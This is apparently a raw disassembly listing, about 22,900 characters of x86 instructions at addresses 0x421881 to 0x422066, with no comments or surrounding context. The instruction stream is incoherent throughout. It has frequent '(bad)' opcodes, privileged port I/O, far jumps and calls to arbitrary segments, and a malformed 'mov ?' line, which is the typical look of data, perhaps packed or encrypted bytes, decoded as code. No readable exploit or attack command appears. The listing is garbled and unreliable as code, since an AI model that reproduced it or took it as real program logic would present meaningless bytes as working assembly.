  421881:	or     BYTE PTR [esi+ecx*2+0x77],bl
  421885:	pusha  
  421886:	adc    edi,ebx
  421888:	in     eax,0x5
  42188a:	je     0x421909
  42188c:	mov    esi,0x4d34b64b
  421891:	div    BYTE PTR [eax]
  421893:	sbb    al,0xa6
  421895:	inc    edi
  421896:	dec    edi
  421897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421898:	jb     0x421902
  42189a:	lods   eax,DWORD PTR ds:[esi]
  42189b:	sub    ebx,DWORD PTR ds:0x127d9eeb
  4218a1:	add    eax,0xaeedf3fc
  4218a6:	mov    ah,dh
  4218a8:	sbb    esp,DWORD PTR [esi+0x4c9560c]
  4218ae:	push   esi
  4218af:	pop    edx
  4218b0:	mov    dh,0x9a
  4218b2:	mov    gs,WORD PTR [ebp-0x4e]
  4218b5:	(bad)  
  4218b7:	aas    
  4218b8:	jae    0x42183e
  4218ba:	test   DWORD PTR [edx],0x43337fb1
  4218c0:	inc    ebx
  4218c1:	push   esp
  4218c2:	shr    BYTE PTR [esi],cl
  4218c4:	loop   0x4218ca
  4218c6:	jmp    DWORD PTR [edx-0x4b]
  4218c9:	mov    al,ds:0x1424b582
  4218ce:	cmp    BYTE PTR [ecx-0x2cc69ee2],dl
  4218d4:	mov    eax,0xe511666d
  4218d9:	sbb    WORD PTR [esi],bp
  4218dc:	or     eax,0x88c8d8d2
  4218e1:	xchg   edx,eax
  4218e2:	cld    
  4218e3:	push   esp
  4218e4:	int3   
  4218e5:	bts    esi,ebx
  4218e8:	inc    ebp
  4218e9:	mov    DWORD PTR [eax],esp
  4218eb:	ror    BYTE PTR [esi+0x64],1
  4218ee:	push   esp
  4218ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218f0:	mov    ds:0x9e58ba14,al
  4218f5:	sahf   
  4218f6:	arpl   WORD PTR [ebx+0x3b],di
  4218f9:	fmul   DWORD PTR [eax+eax*2-0x11]
  4218fd:	and    al,0x13
  4218ff:	fsubr  DWORD PTR [eax]
  421901:	cmp    DWORD PTR ds:0xd90692fd,esp
  421907:	(bad)  
  421908:	dec    ebx
  421909:	stos   BYTE PTR es:[edi],al
  42190a:	jne    0x4218a8
  42190c:	dec    edx
  42190d:	adc    DWORD PTR [edx+0x1ba31594],0xffffffc6
  421914:	mov    cl,0x3f
  421916:	xor    eax,0x2fce3f84
  42191b:	arpl   bx,bp
  42191d:	repnz xor cl,BYTE PTR [eax+0x740b644f]
  421924:	xor    esi,DWORD PTR gs:[ecx+eiz*1-0x65]
  421929:	push   cs
  42192a:	jbe    0x421911
  42192c:	jnp    0x42192e
  42192e:	xor    bh,ah
  421930:	add    DWORD PTR [eax],eax
  421932:	cmp    eax,0x207a023
  421937:	icebp  
  421938:	xor    dh,dh
  42193a:	jmp    0x2111d3c2
  42193f:	std    
  421940:	test   DWORD PTR [esi],0x5f68dfc
  421946:	add    DWORD PTR [eax+eax*4],eax
  421949:	aaa    
  42194a:	mov    ecx,0x6e0e0555
  42194f:	enter  0x578f,0x45
  421953:	jmp    0x5c4e968
  421958:	test   al,0x8c
  42195a:	adc    DWORD PTR [ebx+0x68475a81],esp
  421960:	adc    BYTE PTR [ebx],bl
  421962:	push   eax
  421963:	xchg   edx,eax
  421964:	sbb    al,BYTE PTR cs:[ecx-0x4]
  421968:	or     DWORD PTR [ebx-0x18c4e28c],ebp
  42196e:	jo     0x421911
  421970:	lods   al,BYTE PTR ds:[esi]
  421971:	lods   al,BYTE PTR ds:[esi]
  421972:	jmp    0x421902
  421974:	js     0x42198a
  421976:	scas   eax,DWORD PTR es:[edi]
  421977:	das    
  421978:	xchg   edi,eax
  421979:	xchg   ecx,eax
  42197a:	imul   esi,DWORD PTR [ebp+0x2b157d14],0xfffffff3
  421981:	(bad)  
  421982:	push   esp
  421983:	or     ch,BYTE PTR [ecx+0x5a]
  421986:	push   ecx
  421987:	xchg   DWORD PTR [eax-0x79468e8f],eax
  42198d:	jg     0x42191a
  42198f:	inc    edi
  421990:	xchg   esp,eax
  421991:	iret   
  421992:	sbb    esp,DWORD PTR [ebp-0x2a53780]
  421998:	xor    BYTE PTR ds:0xfe2eb174,ch
  42199e:	gs pop ss
  4219a0:	and    DWORD PTR [edx],esi
  4219a2:	nop
  4219a3:	inc    ebx
  4219a4:	inc    esp
  4219a5:	fisubr DWORD PTR [ebp-0x5c]
  4219a8:	ror    DWORD PTR [ecx],1
  4219aa:	add    al,bl
  4219ac:	mov    eax,0x7445c5d3
  4219b1:	add    DWORD PTR [edx],esp
  4219b3:	popf   
  4219b4:	scas   al,BYTE PTR es:[edi]
  4219b5:	dec    edx
  4219b6:	jno    0x4219e5
  4219b8:	add    BYTE PTR [eax+0x6d],dh
  4219bb:	data16 add al,0x37
  4219be:	push   edx
  4219bf:	test   al,0x4a
  4219c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219c2:	pushf  
  4219c3:	push   ss
  4219c4:	retf   
  4219c5:	xchg   edx,eax
  4219c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219c7:	push   DWORD PTR [ebp-0x56]
  4219ca:	lods   al,BYTE PTR ds:[esi]
  4219cb:	xor    edx,DWORD PTR [edi+0x6f5a4308]
  4219d1:	or     DWORD PTR [edx+edx*4-0x14],eax
  4219d5:	mov    edi,0x4007597e
  4219da:	and    al,0x91
  4219dc:	shr    DWORD PTR [edx+0x79e67c0d],0x2c
  4219e3:	(bad)  
  4219e4:	push   ebp
  4219e5:	mov    bl,0x5
  4219e7:	or     al,0xd1
  4219e9:	push   0x64
  4219eb:	mov    dl,dh
  4219ed:	and    ebx,ebp
  4219ef:	es push cs
  4219f1:	cmp    esp,DWORD PTR [ebp+0x4c]
  4219f4:	push   ebx
  4219f5:	and    ah,bh
  4219f7:	push   esp
  4219f8:	jmp    0xbaa6:0x15413393
  4219ff:	pop    esp
  421a00:	iret   
  421a01:	adc    al,cl
  421a03:	mov    edx,0xc8f2fa68
  421a08:	xchg   BYTE PTR [esi-0x47c5b937],al
  421a0e:	popa   
  421a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a10:	test   BYTE PTR ds:0xace38b1,bl
  421a16:	ss push ecx
  421a18:	popa   
  421a19:	das    
  421a1a:	dec    edx
  421a1b:	cld    
  421a1c:	sti    
  421a1d:	mov    esi,0x32c8e4ae
  421a22:	mov    al,0xbf
  421a24:	dec    ebx
  421a25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a26:	out    0xfd,al
  421a28:	sub    dh,ch
  421a2a:	es push ss
  421a2c:	sub    DWORD PTR [eax],ebp
  421a2e:	fwait
  421a2f:	jecxz  0x421aad
  421a31:	stos   WORD PTR es:[edi],ax
  421a33:	mov    esp,DWORD PTR ds:0xe6fc7fbe
  421a39:	adc    al,0x3e
  421a3b:	imul   esi,DWORD PTR [esi],0x88b3bf11
  421a41:	pop    ds
  421a42:	inc    esp
  421a43:	add    edi,eax
  421a45:	jo     0x421a6d
  421a47:	lea    ecx,ds:0x4c97eb2c
  421a4d:	mov    cl,BYTE PTR [eax-0x2c]
  421a50:	mov    BYTE PTR [ecx+0x626f815b],0x35
  421a57:	or     al,0xd8
  421a59:	sbb    eax,DWORD PTR [esp+edx*8]
  421a5c:	rol    bl,0x4b
  421a5f:	sbb    edi,DWORD PTR [ebp+0x7617afe0]
  421a65:	jmp    0x85b399b
  421a6a:	pushf  
  421a6b:	inc    edx
  421a6c:	das    
  421a6d:	ffreep st(1)
  421a6f:	dec    ecx
  421a70:	xchg   ebx,eax
  421a71:	add    DWORD PTR [edi+ecx*2-0x70],ebx
  421a75:	mov    ebp,0xb25f9493
  421a7a:	call   FWORD PTR [esi-0x29]
  421a7d:	xor    al,0x30
  421a7f:	fsubr  QWORD PTR [eax-0x5d]
  421a82:	inc    ebp
  421a83:	inc    eax
  421a84:	xor    eax,0xe0952943
  421a89:	xor    al,0xcc
  421a8b:	mov    dh,0xbd
  421a8d:	mov    ds:0x8470c552,eax
  421a92:	lods   al,BYTE PTR ds:[esi]
  421a93:	mov    al,ds:0x7395651
  421a98:	mov    bl,0x94
  421a9a:	xchg   ebx,eax
  421a9b:	or     ecx,DWORD PTR [ecx]
  421a9d:	enter  0x86e7,0x24
  421aa1:	push   ebx
  421aa2:	adc    bl,ch
  421aa4:	shl    BYTE PTR [ebx*2+0x22dc5f66],1
  421aab:	add    DWORD PTR [edx-0x2],0x6dd45e10
  421ab2:	loope  0x421ae0
  421ab4:	xor    ch,BYTE PTR [ebx+0x11f5f32f]
  421aba:	or     BYTE PTR [ecx+0x12d9bec5],0xe5
  421ac1:	imul   ecx,edx,0xffffff8d
  421ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ac5:	xor    al,0x6f
  421ac7:	jne    0x421b26
  421ac9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aca:	dec    ecx
  421acb:	neg    DWORD PTR ds:0xca4050c7
  421ad1:	les    sp,DWORD PTR [ecx+0x6c55d46]
  421ad8:	ins    BYTE PTR es:[edi],dx
  421ad9:	mov    ds:0x1db2db5,al
  421ade:	push   edx
  421adf:	outs   dx,DWORD PTR ds:[esi]
  421ae0:	pop    ds
  421ae1:	sahf   
  421ae2:	inc    edx
  421ae3:	mov    al,ds:0xd6a9dff
  421ae8:	push   DWORD PTR [edx-0x58d16d87]
  421aee:	stos   DWORD PTR es:[edi],eax
  421aef:	mov    ds:0x8204db4a,al
  421af4:	dec    edx
  421af5:	xchg   ebx,eax
  421af6:	xchg   BYTE PTR [edx+0x6ca0c146],cl
  421afc:	clc    
  421afd:	jecxz  0x421ac2
  421aff:	sub    ch,bh
  421b01:	rcr    BYTE PTR [esi+edi*4-0x80],0x95
  421b06:	xchg   ebp,eax
  421b07:	add    eax,0x298c4f8c
  421b0c:	pop    ss
  421b0d:	inc    edx
  421b0e:	xchg   esi,eax
  421b0f:	jbe    0x421adc
  421b11:	int3   
  421b12:	dec    esp
  421b13:	popf   
  421b14:	dec    edx
  421b15:	sub    eax,0x94c34d41
  421b1a:	or     ecx,DWORD PTR [ecx-0x610d130c]
  421b20:	adc    eax,0x9611adba
  421b25:	jmp    0x421aeb
  421b27:	or     eax,0xee597439
  421b2c:	add    DWORD PTR cs:[edi],esp
  421b2f:	inc    esi
  421b30:	es jl  0x421adb
  421b33:	in     eax,dx
  421b34:	loop   0x421b08
  421b36:	xchg   ebp,eax
  421b37:	adc    eax,0x7fa85864
  421b3c:	cmp    BYTE PTR [ecx+0x33],ah
  421b3f:	out    dx,al
  421b40:	test   BYTE PTR [ebp+0x61],0xb8
  421b44:	jle    0x421b2a
  421b46:	mov    cl,bl
  421b48:	js     0x421bc5
  421b4a:	mov    ds:0x82c34980,eax
  421b4f:	lahf   
  421b50:	shl    bh,0x6d
  421b53:	retf   0x6dc5
  421b56:	retf   
  421b57:	cmp    eax,0xe4cbce57
  421b5c:	mov    ah,0x2b
  421b5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421b5f:	sbb    eax,eax
  421b61:	ret    
  421b62:	mov    ch,0xa3
  421b64:	icebp  
  421b65:	add    DWORD PTR [edx],0x0
  421b68:	das    
  421b69:	or     eax,0x6b088ef4
  421b6e:	fistp  WORD PTR [edi+0xf]
  421b71:	or     BYTE PTR [ebp+0x467be44c],bl
  421b77:	enter  0x5351,0x26
  421b7b:	call   DWORD PTR [edx]
  421b7d:	sbb    eax,0xf7fa61c3
  421b82:	adc    eax,0xfa01f32a
  421b87:	mov    ebp,0x775d485b
  421b8c:	xchg   edi,eax
  421b8d:	sub    ch,BYTE PTR [edx]
  421b8f:	retf   
  421b90:	mov    gs,WORD PTR [edi-0x262e5595]
  421b96:	test   eax,0x7f590244
  421b9b:	add    BYTE PTR [esi],dh
  421b9d:	sub    eax,0x56d5a17e
  421ba2:	or     ecx,DWORD PTR [ecx-0x32]
  421ba5:	and    eax,DWORD PTR [ebp+0x7b]
  421ba8:	push   esi
  421ba9:	mov    ds:0xdee14f7e,eax
  421bae:	dec    edi
  421baf:	ficom  DWORD PTR [edx+eiz*2+0x63]
  421bb3:	outs   dx,BYTE PTR ds:[esi]
  421bb4:	outs   dx,BYTE PTR ds:[esi]
  421bb5:	push   edx
  421bb6:	and    DWORD PTR [edx+0x71],esi
  421bb9:	in     al,dx
  421bba:	or     bh,dl
  421bbc:	mov    cl,0x4c
  421bbe:	in     eax,0xc9
  421bc0:	call   0xa253:0x3f41d012
  421bc7:	hlt    
  421bc8:	fldenv [ecx+0x36c75a41]
  421bce:	inc    ecx
  421bcf:	inc    edx
  421bd0:	xchg   edx,eax
  421bd1:	addr16 out 0xa8,al
  421bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421bd5:	and    DWORD PTR [ecx+0x653de346],ecx
  421bdb:	sub    eax,0x64ec45c1
  421be0:	leave  
  421be1:	in     al,0x1f
  421be3:	gs and eax,0xc31e1f2e
  421be9:	cmc    
  421bea:	fstp   QWORD PTR [esi-0x8]
  421bed:	test   al,0x65
  421bef:	je     0x421c61
  421bf1:	test   al,0xd2
  421bf3:	inc    edx
  421bf4:	call   0xa465:0x9967e61d
  421bfb:	pop    edx
  421bfc:	add    sp,WORD PTR [esi]
  421bff:	ret    
  421c00:	add    DWORD PTR ds:0x471e5200,eax
  421c06:	gs out 0x9,al
  421c09:	ror    DWORD PTR [edi-0x71],cl
  421c0c:	lock sti 
  421c0e:	adc    BYTE PTR [esi],dh
  421c10:	shl    BYTE PTR [edx],cl
  421c12:	xor    al,0x49
  421c14:	addr16 (bad) 
  421c17:	pop    ss
  421c18:	aaa    
  421c19:	pop    ebx
  421c1a:	jns    0x421bd1
  421c1c:	xor    ch,BYTE PTR [edi]
  421c1e:	adc    DWORD PTR [eax+edx*1],esi
  421c21:	mov    ds:0x242514c0,eax
  421c26:	(bad)  
  421c27:	into   
  421c28:	ror    DWORD PTR [edx],0xe4
  421c2b:	adc    edx,ebp
  421c2d:	push   cs
  421c2e:	arpl   bp,ax
  421c30:	pop    eax
  421c31:	mov    eax,ds:0x666149ff
  421c36:	cdq    
  421c37:	and    edx,DWORD PTR es:[ecx+0x3c]
  421c3b:	and    eax,ebx
  421c3d:	ret    0x5a5e
  421c40:	call   0x731b:0x68b5d06
  421c47:	mov    eax,ds:0x11d9a329
  421c4c:	add    al,0xc4
  421c4e:	inc    edi
  421c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c50:	mov    al,ds:0x22269dbb
  421c55:	mov    esp,0x36119b17
  421c5a:	or     esp,0x94fe3d21
  421c60:	mov    edi,0x8992ca86
  421c65:	ja     0x421c0d
  421c67:	ret    
  421c68:	mov    ah,0xbe
  421c6a:	ds inc esp
  421c6c:	push   0x17492f01
  421c71:	mov    cl,0x9f
  421c73:	es (bad) 
  421c75:	repnz cdq 
  421c77:	fisub  WORD PTR [eax-0x6f]
  421c7a:	add    al,al
  421c7c:	pusha  
  421c7d:	and    BYTE PTR ss:[ebp+0x35],ch
  421c81:	push   ds
  421c82:	dec    esi
  421c83:	mov    edi,0x7a7fbb51
  421c88:	adc    DWORD PTR [edi+0x38f40376],0x3d5a0480
  421c92:	jge    0x421c66
  421c94:	(bad)  
  421c95:	int    0xb1
  421c97:	adc    al,0xee
  421c99:	nop
  421c9a:	test   eax,0x20fd3e40
  421c9f:	std    
  421ca0:	cli    
  421ca1:	cdq    
  421ca2:	bound  ebx,QWORD PTR [ebx]
  421ca4:	inc    BYTE PTR [eax]
  421ca6:	and    eax,0x3925ca86
  421cab:	std    
  421cac:	dec    esp
  421cad:	pop    edx
  421cae:	loope  0x421cd2
  421cb0:	sti    
  421cb1:	fs test ah,cl
  421cb4:	scas   al,BYTE PTR es:[edi]
  421cb5:	inc    esi
  421cb6:	cmp    bl,BYTE PTR [ecx+eiz*4+0x1f]
  421cba:	or     ecx,DWORD PTR cs:[ecx+0x5d10974e]
  421cc1:	mov    bh,0x85
  421cc3:	aas    
  421cc4:	mov    DWORD PTR [eax-0x49c1a478],edi
  421cca:	(bad)  
  421ccb:	mov    edi,DWORD PTR [ebx]
  421ccd:	fmul   DWORD PTR [edi+0x37ceb037]
  421cd3:	ror    DWORD PTR [eax-0x57952c44],cl
  421cd9:	imul   esi,DWORD PTR [esi+0x7085f2ff],0x8f36935
  421ce3:	iret   
  421ce4:	xor    bl,bh
  421ce6:	les    edi,FWORD PTR cs:[ebx-0x23]
  421cea:	sub    DWORD PTR [ebx-0x58da9b00],ebp
  421cf0:	mov    WORD PTR [edi],ss
  421cf2:	fdivr  DWORD PTR ds:0xa8275826
  421cf8:	and    al,0x2
  421cfa:	jl     0x421cc9
  421cfc:	out    dx,eax
  421cfd:	sub    eax,0x5678023
  421d02:	dec    esp
  421d03:	in     al,dx
  421d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d05:	dec    ebx
  421d06:	repnz push DWORD PTR [esi-0x26]
  421d0a:	mov    eax,0xddc21121
  421d0f:	icebp  
  421d10:	or     al,0x3a
  421d12:	je     0x421d53
  421d14:	mov    ds:0xc05d10e1,al
  421d19:	es jmp 0x9920:0x691dc91d
  421d21:	retf   0xf6c0
  421d24:	inc    ebp
  421d25:	shl    BYTE PTR [ebx+edi*1+0x47b34b1],1
  421d2c:	(bad)  
  421d2e:	and    DWORD PTR [edx+0x60c6418a],eax
  421d34:	stos   DWORD PTR es:[edi],eax
  421d35:	mov    ah,cl
  421d37:	and    DWORD PTR [edx+0x49ad42c0],eax
  421d3d:	sbb    DWORD PTR [ebx],ecx
  421d3f:	ret    0xd04f
  421d42:	push   0xc2c4f2c9
  421d47:	xor    dl,dl
  421d49:	xchg   DWORD PTR fs:[ebx-0x112778da],ebx
  421d50:	es sub dh,ah
  421d53:	sti    
  421d54:	(bad)  
  421d55:	bound  edi,QWORD PTR [ebp-0x31904157]
  421d5b:	scas   eax,DWORD PTR es:[edi]
  421d5c:	loopne 0x421da9
  421d5e:	arpl   bx,ax
  421d60:	clc    
  421d61:	(bad)  
  421d63:	sbb    BYTE PTR [ecx],dh
  421d65:	pop    edx
  421d66:	call   0x9f0f:0x52a02048
  421d6d:	pop    ebp
  421d6e:	pop    esi
  421d6f:	(bad)  
  421d70:	pop    edi
  421d71:	ja     0x421d7d
  421d73:	mov    al,BYTE PTR [ecx]
  421d75:	jge    0x421cf8
  421d77:	std    
  421d78:	jns    0x421d8a
  421d7a:	test   DWORD PTR [esi-0x12],0x703a7aa
  421d81:	add    eax,esp
  421d83:	mov    eax,ds:0xc07c17e6
  421d88:	add    BYTE PTR [eax],dh
  421d8a:	cwde   
  421d8b:	fadd   QWORD PTR [ebx+0x27]
  421d8e:	div    al
  421d90:	into   
  421d91:	stc    
  421d92:	jmp    0x421df4
  421d94:	lahf   
  421d95:	repz mov ds:0xa69f1e26,eax
  421d9b:	pop    ds
  421d9c:	data16 xchg cl,dh
  421d9f:	inc    dx
  421da1:	inc    ebx
  421da2:	xchg   edi,eax
  421da3:	or     eax,0x29a954be
  421da8:	xor    al,0x15
  421daa:	xor    al,0x5c
  421dac:	test   al,0xd5
  421dae:	jo     0x421d58
  421db0:	or     edi,DWORD PTR cs:[edx+0x4c]
  421db4:	sub    bh,BYTE PTR [esi+0x70fc131f]
  421dba:	dec    edx
  421dbb:	adc    al,0x57
  421dbd:	jbe    0x421d8e
  421dbf:	xchg   ecx,eax
  421dc0:	adc    eax,0x9a8e8d73
  421dc5:	fistp  DWORD PTR ds:0x8fb1274d
  421dcb:	retf   0x612d
  421dce:	xchg   edi,eax
  421dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dd0:	sbb    sp,WORD PTR [edi]
  421dd3:	rol    BYTE PTR [ebp+0x27395248],1
  421dd9:	test   eax,0x754a4704
  421dde:	fsubr  QWORD PTR [edx]
  421de0:	push   esi
  421de1:	pop    eax
  421de2:	mov    ds:0x7cfee4fe,al
  421de7:	out    dx,al
  421de8:	pop    esp
  421de9:	mov    eax,ds:0x29931382
  421dee:	dec    esp
  421def:	mov    bh,0x6a
  421df1:	mov    ah,0x4
  421df3:	adc    al,0x48
  421df5:	cli    
  421df6:	stc    
  421df7:	mov    cs,edi
  421df9:	ret    0x4479
  421dfc:	in     eax,dx
  421dfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dfe:	rol    DWORD PTR ds:0x2e02a319,cl
  421e04:	retf   0x2c18
  421e07:	test   ebp,esp
  421e09:	mov    bl,0xc9
  421e0b:	popa   
  421e0c:	cwde   
  421e0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e0e:	fnstenv [edx]
  421e10:	lock rcl DWORD PTR [esp+edi*2+0x3fbf473],cl
  421e18:	mov    esp,0x404c866e
  421e1d:	xor    bl,ah
  421e1f:	(bad)  
  421e20:	mov    edx,0x1bfa5aae
  421e25:	and    BYTE PTR [eax],ah
  421e27:	sbb    al,0x6a
  421e29:	jbe    0x421ddc
  421e2b:	sbb    DWORD PTR [ebp+0x9aa4435],0x8640333e
  421e35:	push   ebx
  421e36:	scas   al,BYTE PTR es:[edi]
  421e37:	push   ebp
  421e38:	popa   
  421e39:	stc    
  421e3a:	ret    0xd068
  421e3d:	and    bl,ch
  421e3f:	mov    cl,0x3c
  421e41:	stos   DWORD PTR es:[edi],eax
  421e42:	(bad)  
  421e43:	call   0x12fec6af
  421e48:	rcl    DWORD PTR [esi-0x2651d6dc],0x92
  421e4f:	mov    eax,0x2c508fd2
  421e54:	(bad)  
  421e55:	xor    cl,bl
  421e57:	jb     0x421df9
  421e59:	data16 loope 0x421e80
  421e5c:	xor    dl,BYTE PTR [ebx+0x668a2c70]
  421e62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e63:	or     BYTE PTR [esi-0x55ba70b6],0x57
  421e6a:	xchg   edx,eax
  421e6b:	shl    al,1
  421e6d:	mov    eax,0xa212eb2
  421e72:	mov    al,ds:0xe0a32a55
  421e77:	daa    
  421e78:	jge    0x421e9f
  421e7a:	and    BYTE PTR [ebp-0x53],ah
  421e7d:	push   ss
  421e7e:	mov    ?,WORD PTR [esp+ebx*1]
  421e81:	mov    dl,0x8
  421e83:	add    esp,edi
  421e85:	rcl    BYTE PTR [edx-0x22],1
  421e88:	sub    bl,cl
  421e8a:	mov    BYTE PTR [edx+0x4aebe551],ah
  421e90:	sahf   
  421e91:	ret    
  421e92:	dec    ebx
  421e93:	push   edx
  421e94:	xchg   esi,eax
  421e95:	dec    edx
  421e96:	jle    0x421e4a
  421e98:	lahf   
  421e99:	xchg   edx,eax
  421e9a:	bnd jge 0x421e79
  421e9d:	cmp    ebx,DWORD PTR [edi]
  421e9f:	mov    al,ds:0x9c3e3697
  421ea4:	xchg   esi,ecx
  421ea6:	sub    al,0x1c
  421ea8:	div    ah
  421eaa:	mov    edi,0x1c7a7f66
  421eaf:	loopne 0x421e8a
  421eb1:	mov    ds:0x2963ca26,eax
  421eb6:	pop    esp
  421eb7:	xlat   BYTE PTR ds:[ebx]
  421eb8:	shl    BYTE PTR ss:[ecx+0x5f],1
  421ebc:	fimul  WORD PTR [edx-0x29]
  421ebf:	imul   esi,edi,0xbe6a12cc
  421ec5:	sbb    al,0x15
  421ec7:	daa    
  421ec8:	lods   al,BYTE PTR ds:[esi]
  421ec9:	bound  ebp,QWORD PTR [eax]
  421ecb:	data16 fsub DWORD PTR [edi]
  421ece:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ed0:	ror    BYTE PTR [eax+0x49],cl
  421ed3:	js     0x421f31
  421ed5:	stos   DWORD PTR es:[edi],eax
  421ed6:	mov    bl,BYTE PTR [ebp-0x1b]
  421ed9:	or     ch,BYTE PTR [ebp-0x5e7ddb51]
  421edf:	jg     0x421f4d
  421ee1:	pop    ebx
  421ee2:	cmp    BYTE PTR [ebx+0x4977eccc],cl
  421ee8:	xor    DWORD PTR [edi+0x5b],eax
  421eeb:	add    al,0x1
  421eed:	or     DWORD PTR [eax-0x6b0c029f],ebx
  421ef3:	and    DWORD PTR [ecx],ecx
  421ef5:	mov    esp,0x52f6ead9
  421efa:	mov    al,0x7d
  421efc:	xchg   ebp,eax
  421efd:	xchg   bl,ah
  421eff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f00:	jo     0x421e9c
  421f02:	jne    0x421f79
  421f04:	or     BYTE PTR [eax-0x692af55a],bl
  421f0a:	or     BYTE PTR [eax-0x65],al
  421f0d:	test   edi,0x69938dd2
  421f13:	shr    DWORD PTR [ecx-0x4e],0xa8
  421f17:	add    esi,ebp
  421f19:	sbb    cl,BYTE PTR [esi-0x6b]
  421f1c:	push   ebp
  421f1d:	xchg   esp,eax
  421f1e:	loope  0x421f38
  421f20:	mov    esi,0xed5452b9
  421f25:	aam    0x21
  421f27:	clc    
  421f28:	(bad)  
  421f29:	adc    dh,cl
  421f2b:	(bad)  
  421f2c:	pushf  
  421f2d:	int3   
  421f2e:	sub    ecx,eax
  421f30:	jnp    0x421efb
  421f32:	jmp    0xa5b1:0x679539be
  421f39:	rol    BYTE PTR [ebx+0x2],0xbe
  421f3d:	sbb    bh,BYTE PTR [esi+0x3883dd18]
  421f43:	pushf  
  421f44:	dec    cx
  421f46:	test   DWORD PTR [ebx+0x77],esi
  421f49:	sub    BYTE PTR [edi],ch
  421f4b:	sbb    eax,0x906a033
  421f50:	and    DWORD PTR gs:[edi-0x2e74ec7c],edx
  421f57:	dec    edx
  421f58:	rcl    DWORD PTR [ebp+0x13],1
  421f5b:	popf   
  421f5c:	call   0x904722f
  421f61:	in     al,0x6e
  421f63:	xor    cl,BYTE PTR [ecx+0x43]
  421f66:	inc    ebx
  421f67:	shl    BYTE PTR [ecx+0x1408041c],1
  421f6d:	out    dx,eax
  421f6e:	and    BYTE PTR [ebx],bl
  421f70:	cmp    al,0x73
  421f72:	ds (bad) 
  421f74:	aas    
  421f75:	lahf   
  421f76:	sbb    BYTE PTR [edi-0x22],al
  421f79:	icebp  
  421f7a:	arpl   WORD PTR [edx],si
  421f7c:	sbb    DWORD PTR [edi-0x35],edx
  421f7f:	cdq    
  421f80:	and    eax,0x2abbcdc3
  421f85:	jns    0x421f41
  421f87:	pop    es
  421f88:	add    eax,0x45703335
  421f8d:	mov    cl,0x67
  421f8f:	std    
  421f90:	xlat   BYTE PTR ds:[ebx]
  421f91:	pop    edx
  421f92:	shl    BYTE PTR [ebp+0x5b58e001],1
  421f98:	popf   
  421f99:	aas    
  421f9a:	bound  eax,QWORD PTR [eax]
  421f9c:	xor    BYTE PTR [eax-0x370b3a6],bh
  421fa2:	imul   ebp,ebx,0xffffffef
  421fa5:	dec    ebp
  421fa6:	sbb    al,0x21
  421fa8:	add    al,dh
  421faa:	rcl    cl,cl
  421fac:	mov    al,ds:0xccbbca8a
  421fb1:	or     eax,esp
  421fb3:	shl    BYTE PTR [eax+0xc],cl
  421fb6:	sbb    ebp,eax
  421fb8:	mov    bh,0xd7
  421fba:	retf   0x354d
  421fbd:	cmp    bl,BYTE PTR [ebx+0x74d5d76f]
  421fc3:	(bad)  
  421fc4:	in     al,dx
  421fc5:	adc    dh,BYTE PTR [ebx-0x6a]
  421fc8:	ror    DWORD PTR [ebx],1
  421fca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421fcb:	pop    ecx
  421fcc:	mov    al,BYTE PTR [ecx+ebp*2+0x7ba403ad]
  421fd3:	pop    ebp
  421fd4:	mov    ch,0x68
  421fd6:	in     al,0xee
  421fd8:	dec    edx
  421fd9:	push   ebx
  421fda:	mov    ds:0x11f0d9e8,al
  421fdf:	adc    eax,0xd51b2641
  421fe4:	test   BYTE PTR [ecx+0x6363cfec],cl
  421fea:	pop    ebp
  421feb:	inc    ecx
  421fec:	mul    eax
  421fee:	dec    ecx
  421fef:	ins    BYTE PTR es:[edi],dx
  421ff0:	xchg   BYTE PTR [ebx],bh
  421ff2:	pop    ebx
  421ff3:	push   cs
  421ff4:	out    dx,al
  421ff5:	mov    al,ds:0x403c4830
  421ffa:	sub    al,BYTE PTR [edx+0x4b]
  421ffd:	int    0x1b
  421fff:	cli    
  422000:	call   0xc8a07c60
  422005:	jecxz  0x42207e
  422007:	inc    esi
  422008:	xchg   BYTE PTR [ecx+0x53],dh
  42200b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42200c:	adc    DWORD PTR [ebx],0x2fec4963
  422012:	sub    al,0xe0
  422014:	dec    ebp
  422015:	leave  
  422016:	or     al,0xce
  422018:	lods   al,BYTE PTR ds:[esi]
  422019:	push   edi
  42201a:	dec    ecx
  42201b:	imul   DWORD PTR ds:0xe532a0fa
  422021:	loop   0x421fea
  422023:	(bad)  
  422025:	jecxz  0x422057
  422027:	and    edx,DWORD PTR [edx+0x2144ae53]
  42202d:	jmp    0x221a31dc
  422032:	fisub  WORD PTR [ebx]
  422034:	dec    edi
  422035:	nop
  422036:	nop
  422037:	cld    
  422038:	jne    0x422064
  42203a:	stc    
  42203b:	es retf 
  42203d:	cmp    edi,ebx
  42203f:	out    dx,al
  422040:	sub    BYTE PTR [edi+0x3f],bh
  422043:	lds    ecx,FWORD PTR [esi+0x26d8536f]
  422049:	dec    ecx
  42204a:	push   edi
  42204b:	(bad)  
  42204c:	shr    BYTE PTR [edx-0x6e57da57],1
  422052:	sbb    BYTE PTR [esi],cl
  422054:	push   edx
  422055:	push   0x3805c5b3
  42205a:	inc    ebx
  42205b:	and    DWORD PTR [ecx+edx*8-0x4c776c09],ecx
  422062:	pop    edx
  422063:	cmp    DWORD PTR [edi],eax
  422065:	ret    
  422066:	mov    bh,0x0
